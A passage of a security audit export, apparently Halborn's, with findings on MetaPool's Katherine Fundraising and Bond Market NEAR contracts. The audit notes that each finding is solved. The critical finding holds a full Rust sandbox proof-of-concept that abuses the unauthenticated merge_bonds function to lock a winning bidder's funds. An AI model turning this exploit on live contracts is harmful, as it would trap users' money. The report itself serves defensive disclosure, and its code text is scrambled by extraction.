LOCKING DUE TO UNAUTHORIZED BOND MERGING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf", "body": "During our analysis, we identified an issue concerning the merge_bonds function within the system. This function currently lacks any form of authorization, which leaves it open to manipulation by any user, including those with malicious intent. This absence of secure access control allows users to merge any valid bonds, despite the possible implications to the systems stability and security. One such implication is the potential for funds to be indefinitely locked within the BondMarket contract. This problematic scenario occurs when a bond, which is listed for auction sale within the BondMarket contract, is successfully auctioned off. In this case, the winning bidder should ideally be able to claim ownership of the bond via the pull_sale_bond function, which transfers ownership through a cross-contract call to the BondOperator contract. However, should this cross-contract call fail for any reason, the system reverts to a state where the winning bidder is still recognized as the auction winner through the process_auction_ends_callback function. This state of affairs leads to the funds remaining inaccessible for withdrawal as long as the system perceives that user as the auction winner. The unrestricted access to the merge_bonds function adds another layer of complexity to this issue. A malicious user could manipulate this function, merging a bond currently on sale into another bond, effectively erasing the original bonds identifier data. The deletion of this crucial data in turn results in the persistent failure of the cross-contract call initiated by the pull_sale_bond function. This vulnerability effectively causes the funds committed by the win- ning bidder to be indefinitely locked within the BondMarket contract. 21 Moreover, it obstructs the proper transfer of bond ownership, creating potential liabilities and hindering the smooth operation of the system. Code Location: Down below is a code snippet from the merge_bonds function: Listing 1: contracts/bond-operator-contract/src/lib.rs let bond = self . internal_get_bond ( bond_id ); let mut other = self . internal_get_bond ( other_id ); let new_bond = bond . merge (& mut other ); 371 pub fn merge_bonds (& mut self , bond_id : BondId , other_id : BondId ) { 372 373 374 375 376 377 378 379 380 381 } // Replace with merged bond . self . bonds . insert (& bond_id , & new_bond ); // Remove other bond . self . internal_bond_drop (& other ); BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:H/Y:N/R:N/S:C (9.4) Proof Of Concept: Listing 2: src/halborn_testcases/test_merge_bond_on_sale.rs let worker = workspaces :: sandbox () . await ?; let root_account = worker . root_account () ?; 142 #[ tokio :: test ] 143 async fn test_merge_bond_on_sale () -> anyhow :: Result <() > { 144 145 146 147 148 149 150 151 152 . create_subaccount (\" halborn \") . initial_balance (199999999999999900000000000) . transact () . await ? let halborn_account = root_account 22 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 . into_result () ?; let katherine_owner_account = root_account . create_subaccount (\" katowner \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let kickstarter_owner_account = root_account . create_subaccount (\" kickowner \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let metapool_account = root_account . create_subaccount (\" metapool \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let katherine_account = root_account . create_subaccount (\" katherine \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let supporter_account = root_account . create_subaccount (\" supporter \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let buyer_account = root_account . create_subaccount (\" buyer \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; 23 let bond_market_owner_account = root_account . create_subaccount (\" bondmarket - owner \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let bond_operator_owner = root_account . create_subaccount (\" bondoperator - owner \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let bond_market_operator_account = root_account . create_subaccount (\" bondoperator \") . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let bond_market_account = root_account . create_subaccount (\" bondmarket \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let ptoken_account = root_account . create_subaccount (\" ptoken \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 // deploying contracts let metapool_contract = deploy_meta_pool (&  katherine_owner_account , & metapool_account ). await ?; 234 235 let ptoken_contract = deploy_ptoken (& katherine_owner_account ,  & ptoken_account ). await ?; 236 237 238 let bond_market_contract = deploy_bond_market ( & bond_market_owner_account , & bond_market_account , 24 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 metapool_contract . id () , ) . await ?; let bond_operator_contract = deploy_operator ( & bond_operator_owner , & bond_market_operator_account , & metapool_account , & bond_market_contract , & bond_market_owner_account , ) . await ?; let current_epoch : EpochMillis = metapool_contract . call ( \" get_epoch \" ) . args_json ( json! ({}) ) . view () . await ? . json () ?; println! (\" CURRENT EPOCH : {} \" , current_epoch ); mint_ptokens ( & ptoken_contract , & katherine_owner_account , vec! [ // & katherine_owner_account , & katherine_account , & supporter_account , & buyer_account , ], ) . await ?; let now = Now :: new_from_epoch_millis ( metapool_contract . call (\"  get_epoch \"). view () . await ?. json () ?) ; 272 273  () ; let stnear_freeze_timestamp : EpochMillis = now . to_epoch_millis 274 let stnear_vault_maturity_datetime : EpochMillis = now .  increment_min (40) . to_epoch_millis () ; 275 let ptoken_start_linear_release_datetime : EpochMillis = now .  increment_min (15) . to_epoch_millis () ; 276 let ptoken_vault_maturity_datetime : EpochMillis = now .  increment_min (40) . to_epoch_millis () ; 277 25 278 279 // Import testing bonds let content = fs :: read_to_string ( BONDS_FILEPATH ). expect ( \" Error  reading bond file \"); 280 281 282 283 284 285 286 287 288 289 290 291 let bonds_json = json_reader :: parse (& content ) ?; let bonds = bonds_json [\" bonds \" ]. clone () ; // Vault parameters let vault_id = String :: from ( \" TEST_vault_id \"); let stnear_price_at_freeze : U128 = metapool_contract . call ( \" get_st_near_price \") . view () . await ? . json () ?; let initial_stnear_balance : U128 = calculate_stnear_balance ( bonds . clone () ,  stnear_price_at_freeze . clone () ); 292 let initial_ptoken_balance : U128 = calculate_ptoken_balance (  bonds . clone () ); 293 let ptoken_contract_address : AccountId = ptoken_contract . id () .  clone () ; 294 let interest_beneficiary_until_unfreeze : AccountId =  kickstarter_owner_account . id () . clone () ; 295 296 let interest_beneficiary_near_claimed : U128 = U128 :: from (0) ; let bond_owners_near_claimed : U128 = calculate_near_claimed (  bonds . clone () ); 297 let bond_owners_ptoken_claimed : U128 =  calculate_ptoken_claimed ( bonds . clone () ); 298 let vault_owner_id : AccountId = katherine_owner_account . id () .  clone () ; 299 300 301 302 303 304 305 306 307 308 309 // Create a vault let res = bond_operator_owner . call ( bond_operator_contract . id () , \" create_vault \" ) . args_json ( serde_json :: json! ({ \" vault_id \": vault_id , \" stnear_price_at_freeze \": stnear_price_at_freeze , \" initial_stnear_balance \": initial_stnear_balance , \" initial_ptoken_balance \": initial_ptoken_balance , \" ptoken_contract_address \" : ptoken_contract_address , \" stnear_freeze_timestamp \" : U64 :: from (  stnear_freeze_timestamp ) , 310 \" interest_beneficiary_until_unfreeze \" :  interest_beneficiary_until_unfreeze , 26 311 \" interest_beneficiary_near_claimed \":  interest_beneficiary_near_claimed , 312 313 \" bond_owners_near_claimed \": bond_owners_near_claimed , \" bond_owners_ptoken_claimed \" :  bond_owners_ptoken_claimed , 314 \" stnear_vault_maturity_datetime \": U64 :: from (  stnear_vault_maturity_datetime ) , 315 \" ptoken_start_linear_release_datetime \": U64 :: from (  ptoken_start_linear_release_datetime ) , 316 \" ptoken_vault_maturity_datetime \": U64 :: from (  ptoken_vault_maturity_datetime ) , 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 \" vault_owner_id \" : vault_owner_id , }) ) . gas ( parse_gas! (\" 200 Tgas \" ) as u64 ) . transact () . await ? . into_result () ?; println! (\" Create vault : {:?}\\ n \" , res ); registering_accounts ( & metapool_contract , & ptoken_contract , & bond_operator_contract , & katherine_owner_account , & supporter_account , & buyer_account , & kickstarter_owner_account , & bond_operator_owner , ) . await ?; sending_stnear_ptoken_to_vault ( & metapool_contract , & ptoken_contract , & bond_operator_contract , & katherine_owner_account , & bond_operator_owner , initial_stnear_balance , initial_ptoken_balance , vault_id . clone () , ) . await ?; sending_stnear_ptoken_to_vault ( & metapool_contract , 27 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 & ptoken_contract , & bond_operator_contract , & katherine_owner_account , & bond_operator_owner , initial_stnear_balance , initial_ptoken_balance , vault_id . clone () , ) . await ?; let loader_bonds = create_bond_loader ( bonds , vault_id . clone () , supporter_account . id () . clone () , ptoken_contract_address . clone () , U64 :: from (4 * stnear_vault_maturity_datetime ) , U64 :: from (4 * ptoken_start_linear_release_datetime ) , U64 :: from (4 * ptoken_vault_maturity_datetime ) , ); let res = bond_operator_owner . call ( bond_operator_contract . id () , \" create_bonds \" ) . args_json ( serde_json :: json! ({ \" bonds \" : loader_bonds }) ) . gas ( parse_gas! (\" 200 Tgas \" ) as u64 ) . transact () . await ? . into_result () ?; println! (\" Create bonds : {:?}\\ n \" , res ); let bond1 : BondJSON = bond_operator_contract . call ( \" get_bond \") . args_json ( json! ({ \" bond_id \": 1, }) ) . view () . await ? . json () ?; println! (\" \\ nBOND1 : {:#?} \" , bond1 ); let bond3 : BondJSON = bond_operator_contract . call ( \" get_bond \") . args_json ( json! ({ \" bond_id \": 3, }) ) 28 394 395 396 397 398 399 400 401 402 . view () . await ? . json () ?; println! (\" \\ nBOND3 : {:#?} \" , bond3 ); // 1. Putting bond 3 on sale let price = U128 :: from (10 * ONE_NEAR ); let bond_sale_result = supporter_account . call ( bond_market_contract . id () , \"  create_bond_sale_in_millisecs \") 403 404 405 406 407 408 . args_json ( json! ({ \" bond_id \": 3, \" bond_operator_address \" : bond_operator_contract . id () , \" price \": price , \" currency \" : \" NEAR \" , \" sale_duration_in_millisecs \" : U64 :: from (20 * 1000) , //  20 seconds 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 \" is_auction \": true , }) ) . max_gas () . deposit (1000000000000000000000000) . transact () . await ? . into_result () ?; println! (\" SALE RESULT : {:#?} \" , bond_sale_result ); let bond3 : BondJSON = bond_operator_contract . call ( \" get_bond \") . args_json ( json! ({ \" bond_id \": 3, }) ) . view () . await ? . json () ?; println! (\" \\ nBOND3 after putting on sale : {:#?} \" , bond3 ); let sale : SaleJSON = bond_market_contract . call ( \" get_sale \") . args_json ( json! ({ \" sale_id \" : 0}) ) . view () . await ? . json () ?; println! (\" SALE : {:#?} \" , sale ); 29 436 437 438 // placing a bid let halborn_account_balance_before_bid = halborn_account .  view_account () . await ?. balance ; 439 440 441 442 443 444 445 446 447 let _bid_result = halborn_account . call ( bond_market_contract . id () , \" place_a_near_bid \" ) . args_json ( json! ({ \" sale_id \" : 0}) ) . deposit ( price .0 + 1) . max_gas () . transact () . await ? . into_result () ?; let halborn_account_balance_after_bid = halborn_account .  view_account () . await ?. balance ; 448 449 450 println! ( \" Balance :\\ n {}\\ n {} \" , halborn_account_balance_before_bid ,  halborn_account_balance_after_bid ); let sale : SaleJSON = bond_market_contract . call ( \" get_sale \") . args_json ( json! ({ \" sale_id \" : 0}) ) . view () . await ? . json () ?; println! (\" \\ nSALE after bid : {:#?} \" , sale ); // trying to merge bond 1 and 3 halborn_account . call ( bond_operator_contract . id () , \" merge_bonds \" ) . args_json ( json! ({ \" bond_id \": 1, \" other_id \" : 3, }) ) . transact () . await ? . into_result () ?; // waiting for over 20 seconds for the sale to end ... println! (\" Waiting for the auction to end ... \" ); tokio :: time :: sleep ( tokio :: time :: Duration :: from_secs (21) ) . await 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475  ; 30 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 } println! (\" Auction should be done by now ... \"); // trying to complete the auction sale ... let pull_result = halborn_account . call ( bond_market_contract . id () , \" pull_sale_bond \" ) . args_json ( json! ({ \" sale_id \": 0 }) ) . max_gas () . transact () . await ? . into_result () ?; println! (\" \\ nPULL RESULT : {:#?} \" , pull_result ); let sale : SaleJSON = bond_market_contract . call ( \" get_sale \") . args_json ( json! ({ \" sale_id \" : 0}) ) . view () . await ? . json () ?; println! (\" \\ nSale after trying to pull it : {:#?} \" , sale ); let halborn_account_balance_after_trying_to_pull = halborn_account . view_account () . await ?. balance ; println! ( \" Balance after trying to complete auction : {} \" , halborn_account_balance_after_trying_to_pull ); let remove_bid_result = halborn_account . call ( bond_market_contract . id () , \" remove_loser_bid \" ) . args_json ( json! ({ \" sale_id \" : 0}) ) . transact () . await ? . into_result () ; if let Err ( res ) = remove_bid_result { println! ( \" ERR : {} \" , res ); } Ok (() ) 31 Recommendation: It is recommended to implement an authorization check in the merge_bonds function so that only the user who owns both bonds can merge them. Additionally, merging and splitting bonds should be possible only for bonds that are not on sale. Remediation Plan: SOLVED: The MetaPool has solved this issue in commit ef7772ff by adding a verification mechanism that makes sure only the owner can merge bonds and only if neither bond is on sale. 32 ", "labels": ["Halborn", "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR", "Severity: Critical"]}, {"title": "LOSS OF REWARDS DUE TO KICKSTARTER UPDATE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf", "body": "contract, specifically in the function update_kickstarter. Our analysis revealed a potential vulnerability in the KatherineFundraising This function allows either the contracts owner or Kickstarters owner to modify details pertaining to the fundraising effort. However, the implementation of the update_kickstarter function is flawed as it inadvertently resets storage variables tied to the Kickstarter, including the available_rewards_tokens. The available_rewards_tokens variable is crucial, as it stores the quan- tity of project tokens (ptokens) available to be offered as rewards for supporters. The current implementation of the update_kickstarter func- tion, however, resets this variable to zero each time it is called. As a result, it can unintentionally erase information regarding the remaining ptokens, leading to their loss. Interestingly, this loss of reward tokens occurs even if there are no changes made to the ptoken contract itself. This issue poses a significant threat to the integrity of the fundraising efforts, as it could lead to supporters not receiving the ptokens they were promised, thereby undermining trust in the system. Further, the loss of ptokens could negatively impact the overall fundraising process. Thus, it is essential to address this vulnerability, to ensure proper functioning of the update_kickstarter function, and maintain the accurate count of available_rewards_tokens to protect the integrity and reliability of the KatherineFundraising contract. Code Location: Down below is a code snippet from the internal_update_kickstarter func- tion: 33 Listing 3: contracts/katherine-fundraising-contract/src/kickstarter.rs (Line 412) 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 pub ( crate ) fn internal_update_kickstarter ( & mut self , old_kickstarter : Kickstarter , name : String , slug : String , owner_id : AccountId , open_timestamp : EpochMillis , close_timestamp : EpochMillis , token_contract_address : AccountId , deposits_hard_cap : U128 , max_tokens_to_release_per_stnear : U128 , token_contract_decimals : u8 ) { assert! ( old_kickstarter . open_timestamp >=  get_current_epoch_millis () , 379 \" Changes are not allow after the funding period  started! \" 380 381 382 383 384 385 386 387 ); let id = old_kickstarter . id ; let kickstarter = Kickstarter { id , name , slug , goals : Vector :: new ( Keys :: Goals . as_prefix (& id . to_string  () ). as_bytes () ) , 388 389 390 391 winner_goal_id : None , katherine_fee : None , total_tokens_to_release : None , deposits : UnorderedMap :: new ( Keys :: Deposits . as_prefix (&  id . to_string () ). as_bytes () ) , 392 393  as_bytes () , 394 395 396  as_bytes () , rewards_withdraw : UnorderedMap :: new ( Keys :: RewardWithdraws . as_prefix (& id . to_string () ). ) , stnear_withdraw : UnorderedMap :: new ( Keys :: StnearWithdraws . as_prefix (& id . to_string () ). 397 398 399 ) , total_deposited : 0, deposits_hard_cap : deposits_hard_cap .0 , 34 400 max_tokens_to_release_per_stnear :  max_tokens_to_release_per_stnear .0 , enough_reward_tokens : false , owner_id , active : true , successful : None , stnear_price_at_freeze : None , stnear_price_at_unfreeze : None , creation_timestamp : get_current_epoch_millis () , open_timestamp , close_timestamp , token_contract_address , token_contract_decimals , available_reward_tokens : 0 , }; kickstarter . assert_timestamps () ; self . kickstarters . replace ( id as u64 , & kickstarter ); self . kickstarter_id_by_slug . remove (& old_kickstarter . slug ); self . kickstarter_id_by_slug . insert (& kickstarter . slug , & kickstarter . id ); } 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:C/R:N/S:U (2.0) Recommendation: It is recommended to implement an update_kickstarter function in a way that will not generate value loss in an underlying asset. If the AccoundId associated with ptoken is not changed, then the available_reward_tokens value should not be zeroed-out. On the other hand, if that AccountId changes, then returning already sent tokens to the previous owner may be considered. 35 Remediation Plan: SOLVED: The MetaPool team has solved this issue in commit efadbdc7 by deprecating (and effectively deleting) the update_kickstarter function. 36 ", "labels": ["Halborn", "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR", "Severity: Low"]}, {"title": "DENIAL OF SERVICE CONDITION DUE TO STORAGE BLOATING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf", "body": "During our analysis, we identified a potential issue with the create_vault function, which pertains to the handling of deposit amounts associated with storage fees. The function currently adds values to the contracts storage without ensuring that a sufficient deposit has been sent with the call to cover these storage costs. Importantly, the design of the create_vault function does not currently allow for a deposit to be made at the time of the call. Without an accompanying deposit, the contract is forced to compensate for storage fees from its own free balance. If the contracts free balance is insufficient, the call to create_vault will fail due to lack of funds to cover the storage fees. This situation presents a considerable vulnerability, as it potentially disrupts the contracts operations and the creation of new vaults. More- over, it places an undue burden on the contracts free balance, which could have serious implications if it is not properly monitored and managed. Code Location: Down below is a code snippet from the create_vault function: Listing 4: contracts/bond-operator-contract/src/lib.rs 146 pub fn create_vault ( & mut self , 147 vault_id : VaultId , 148 stnear_price_at_freeze : U128 , 149 initial_stnear_balance : U128 , 150 initial_ptoken_balance : U128 , 151 37 ptoken_contract_address : String , stnear_freeze_timestamp : U64 , interest_beneficiary_until_unfreeze : String , interest_beneficiary_near_claimed : U128 , bond_owners_near_claimed : U128 , bond_owners_ptoken_claimed : U128 , stnear_vault_maturity_datetime : U64 , ptoken_start_linear_release_datetime : U64 , ptoken_vault_maturity_datetime : U64 , vault_owner_id : String self . assert_only_owner () ; self . assert_new_vault_id (& vault_id ); let vault = Vault :: new ( vault_id . clone () , stnear_price_at_freeze .0 , initial_stnear_balance .0 , initial_ptoken_balance .0 , ptoken_contract_address . try_into () . unwrap () , stnear_freeze_timestamp .0 , interest_beneficiary_until_unfreeze . try_into () . unwrap () , interest_beneficiary_near_claimed .0 , bond_owners_near_claimed .0 , bond_owners_ptoken_claimed .0 , stnear_vault_maturity_datetime .0 , ptoken_start_linear_release_datetime .0 , ptoken_vault_maturity_datetime .0 , vault_owner_id . try_into () . unwrap () ); self . vaults . insert (& vault_id , & vault ); 152 153 154 155 156 157 158 159 160 161 162 ) { 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:F/S:U (0.5) Recommendation: To address this issue, it is recommended to revise the create_vault function to accept a deposit that can adequately cover the storage fees. 38 This will ensure the contracts free balance is preserved and prevent the disruption of contract operations due to insufficient funds. Remediation Plan: SOLVED: The MetaPool team solved this issue in commits 164fecd8 and 7e108822 by implementing a requirement for the caller to cover the storage fee associated with creating a new vault. 39 ", "labels": ["Halborn", "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR", "Severity: Informational"]}, {"title": "REDUNDANT STATE VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf", "body": "It was observed that the KatherineFundrasing contract implements a manual assertion in new function that checks if the contracts state already exists. However, the new function is also marked with #[init] macro which implements this behavior by default, making manual assertion redundant Code Location: Down below is a code snippet from the new function: Listing 5: contracts/katherine-fundraising-contract/src/lib.rs (Lines 45,52) Self { 45 #[ init ] 46 pub fn new ( 47 48 49 50 51 ) -> Self { 52  initialized \" ); 53 54 55 56 57  KickstarterId ) , 58 59 60 61 62 63 64 } } owner_id : AccountId , min_deposit_amount : U128 , metapool_contract_address : AccountId , katherine_fee_percent : BasisPoints , assert! ( !env :: state_exists () , \" The contract is already owner_id , supporters : UnorderedMap :: new ( Keys :: Supporters ) , kickstarters : Vector :: new ( Keys :: Kickstarters ) , kickstarter_id_by_slug : UnorderedMap :: new ( Keys :: min_deposit_amount : min_deposit_amount .0 , metapool_contract_address , katherine_fee_percent , max_goals_per_kickstarter : 5, active_projects : UnorderedSet :: new ( Keys :: Active ) , 40 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove redundant code. Remediation Plan: SOLVED: The MetaPool team has solved this issue in commit 6727d175 by removing the redundant code. 41 ", "labels": ["Halborn", "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR", "Severity: Informational"]}, {"title": "REDUNDANT MANUAL CALLBACK ASSERTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf", "body": "The activate_successful_kickstarter_after function is marked with #[ private] macro, which allows this function to only be called by the con- tract itself. However, it was observed that this function is also manually asserting that the predecessor_account_id is equal to current_account_id. Code Location: Down below is a code snippet from the assert_self function: Listing 6: near-sdk-3.1.0/src/utils/mod.rs assert_eq! ( env :: predecessor_account_id () , env :: 16 pub fn assert_self () { 17  current_account_id () , \" Method is private \"); 18 } Down below is a code snippet from the activate_successful_kickstarter_after function: Listing 7: (Lines 97,103) contracts/katherine-fundraising-contract/src/internal.rs pub fn activate_successful_kickstarter_after ( 97 #[ private ] 98 99 100 101 102 103 104 105 ) { & mut self , kickstarter_id : KickstarterId , goal_id : GoalId , assert_self () ; assert_eq! ( env :: promise_results_count () , 42 106 107 108 109 110 111 112 1, \" This is a callback method \" ); let st_near_price = match env :: promise_result (0) { PromiseResult :: NotReady => unreachable! () , PromiseResult :: Failed => panic! (\" Meta Pool is not  available! \" ) , 113 114 PromiseResult :: Successful ( result ) => { let price = near_sdk :: serde_json :: from_slice :: < U128  >(& result ). unwrap () ; price .0 115 116 117 118 }, }; let mut kickstarter = self . internal_get_kickstarter (  kickstarter_id ); 119 120 121 122 match kickstarter . goals . get ( goal_id as u64 ) { None => panic! (\" Kickstarter did not achieved any goal! \") , Some ( goal ) = > { let total_tokens_to_release = self .  calculate_total_tokens_to_release ( 123 124 125 126 & kickstarter , goal . tokens_to_release_per_stnear ); let katherine_fee = self . calculate_katherine_fee (  total_tokens_to_release ); 127 128 assert! ( kickstarter . available_reward_tokens >= (  total_tokens_to_release + katherine_fee ) , 129 \" Not enough available reward tokens to back the  supporters rewards! \" 130 131 132 133 134 135 136 ); kickstarter . winner_goal_id = Some ( goal . id ); kickstarter . active = false ; self . active_projects . remove (& kickstarter . id ); kickstarter . successful = Some ( true ); kickstarter . katherine_fee = Some ( katherine_fee ); kickstarter . total_tokens_to_release = Some (  total_tokens_to_release ); 137 kickstarter . stnear_price_at_freeze = Some (  st_near_price . into () ); 138 139 140 } self . kickstarters . replace ( kickstarter_id as u64 , & kickstarter ); 43 } 141 142 143 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove redundant code. Remediation Plan: SOLVED: The MetaPool team has solved this issue in commit abe7e854 by removing redundant code. 44 ", "labels": ["Halborn", "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR", "Severity: Informational"]}, {"title": "NOT NECESSARY MACRO USAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf", "body": "Some impl blocks of KatherineFundraising contract are marked with #[ near_bindgen] macro, although they define only internal functions. Code Location: Down below is a code snippet from the internal_create_goal function: Listing 8: contracts/katherine-fundraising-contract/src/goal.rs (Lines 36,38,93) pub ( crate ) fn internal_create_goal ( & mut self , kickstarter : & mut Kickstarter , name : String , desired_amount : U128 , unfreeze_timestamp : EpochMillis , tokens_to_release_per_stnear : U128 , cliff_timestamp : EpochMillis , end_timestamp : EpochMillis , ) -> GoalId { 36 #[ near_bindgen ] 37 impl KatherineFundraising { 38 39 40 41 42 43 44 45 46 47 48 49 50  max_goals_per_kickstarter ); 51 52 53  tokens_to_release_per_stnear .0; 54 55 56 57  \" let desired_amount = desired_amount .0; let tokens_to_release_per_stnear = kickstarter . assert_goal_status () ; kickstarter . assert_before_funding_period () ; kickstarter . assert_number_of_goals ( self . let id = kickstarter . get_number_of_goals () ; assert! ( kickstarter . deposits_hard_cap >= desired_amount , \" Desired amount must not exceed the deposits hard cap! 45 kickstarter . max_tokens_to_release_per_stnear >= \" Tokens to release must not exceed the max tokens to let last_goal = kickstarter . goals . get (( id - 1) as u64 ) desired_amount >= last_goal . desired_amount , \" Next goal cannot have a lower desired amount that unfreeze_timestamp <= last_goal . unfreeze_timestamp \" Next goal cannot freeze supporter funds any tokens_to_release_per_stnear >= last_goal . \" Next goal cannot release less pTOKEN than the assert! ( ); assert! ( ); assert! ( 58 59 60  tokens_to_release_per_stnear , 61  release per stNEAR! \" ); 62 if id > 0 { 63 64  . unwrap () ; 65 66 67  the last goal! \" 68 69 70  , 71  longer than the last goal! \" ); 72 assert! ( 73 74  tokens_to_release_per_stnear , 75  last goal! \" 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 } let goal = Goal { goal . id ); } id , name , desired_amount , unfreeze_timestamp , tokens_to_release_per_stnear , cliff_timestamp , end_timestamp , }; kickstarter . goals . push (& goal ); self . kickstarters . replace ( kickstarter . id as u64 , & kickstarter ); 46 pub ( crate ) fn internal_delete_last_goal (& mut self , kickstarter 93  : & mut Kickstarter ) { 94 95 96 97 98 99 100 } } kickstarter . assert_goal_status () ; kickstarter . assert_before_funding_period () ; kickstarter . goals . pop () ; self . kickstarters . replace ( kickstarter . id as u64 , & kickstarter ); Down below is a code snippet from the assert_min_deposit_amount function: 9: Listing (Lines 45,47,56,83) contracts/katherine-fundraising-contract/src/deposit.rs fn assert_min_deposit_amount (& self , amount : Balance ) { amount >= self . min_deposit_amount , \" minimum deposit amount is {} \" , self . min_deposit_amount } ); assert! ( 45 #[ near_bindgen ] 46 impl KatherineFundraising { 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  amount ; 67 68 69 70 71 assert! ( ) { // / Process a stNEAR deposit to Katherine Contract . fn process_supporter_deposit ( & mut self , supporter_id : & AccountId , amount : & Balance , kickstarter : & mut Kickstarter , // Update Kickstarter kickstarter . assert_within_funding_period () ; kickstarter . assert_enough_reward_tokens () ; let new_total_deposited = kickstarter . total_deposited + new_total_deposited <= kickstarter . deposits_hard_cap , \" The deposits hard cap cannot be exceeded! \" ); kickstarter . total_deposited = new_total_deposited ; 47 } ) { self . kickstarters . replace ( kickstarter . id as u64 , & kickstarter ); kickstarter . update_supporter_deposits (& supporter_id , & mut self , amount : Balance , kickstarter : & mut Kickstarter , // Update Supporter . let mut supporter = self . internal_get_supporter (& supporter . supported_projects . insert (& kickstarter . id ); self . supporters . insert (& supporter_id , & supporter ); // / Process a reward token deposit to Katherine Contract . fn process_kickstarter_deposit ( 72  amount ); 73 74 75 76 77  supporter_id ); 78 79 80 81 82 83 84 85 86 87 88 89 90 91  contract .\" 92 93 94  close_timestamp , 95  funding period ends . \" ); 96 let amount = kickstarter . less_to_24_decimals ( amount ); 97 let max_tokens_to_release = self . 98  calculate_max_tokens_to_release (& kickstarter ); 99 100 101 102 103 kickstarter . available_reward_tokens += amount ; kickstarter . enough_reward_tokens = { \" Kickstarter Tokens should be provided before the get_current_epoch_millis () < kickstarter . kickstarter . available_reward_tokens >= ); assert! ( assert_eq! ( & env :: predecessor_account_id () , & kickstarter . token_contract_address , \" Deposited tokens do not correspond to the Kickstarter let min_tokens_to_allow_support = max_tokens_to_release + self . calculate_katherine_fee ( max_tokens_to_release );  min_tokens_to_allow_support }; self . kickstarters . replace ( kickstarter . id as u64 , & kickstarter ); 104 105 106 107 108 } } 48 109 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to remove the unnecessary #[near_bindgen] macro usage. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit 25c435f5 by removing the unnecessary macro usage. 49 ", "labels": ["Halborn", "MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR", "Severity: Informational"]}, {"title": "REDUNDANT FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf", "body": "The KatherineFundraising contract defines a delete_kickstarter function. All the function does is cause the contract to panic with information that a Kickstarter cannot be deleted. The KatherineFundraising contract does not implement any standard that would require delete_kickstarter function to be present. As a consequence, there is no value originating from this function, yet it is present in the wasm binary making it bigger, which directly impacts the deployment costs. Code Location: Down below is a code snippet from the delete_kickstarter function: Listing 